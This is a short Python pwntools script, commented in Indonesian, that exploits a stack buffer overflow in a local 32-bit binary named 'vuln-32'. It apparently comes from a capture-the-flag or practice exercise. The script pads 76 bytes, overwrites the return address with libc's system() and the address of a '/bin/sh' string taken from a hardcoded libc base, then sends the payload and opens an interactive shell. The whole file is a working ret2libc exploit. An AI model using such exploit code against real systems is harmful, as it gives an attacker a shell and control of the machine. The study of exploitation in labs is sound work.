from pwn import *

p = process("./vuln-32")

junk = 76

libc_base = 0xf7d82000

retur_addr_arg = p32(0x0)

system = p32(libc_base + 0x4c910) # Fungsi System dari Library libc, dengan cara mencari base address libc + ukuran fungs/argumen
bin_sh_arg = p32(libc_base + 0x1b5faa) # Argument /bin/sh dari library libc dengan cara mencari base address libc + ukuran fungs/argumen

payload = b"A" * junk + system + retur_addr_arg + bin_sh_arg # susunan param berada pada stack karena 32 bit

write("payload",payload)

p.sendline(payload)
p.interactive()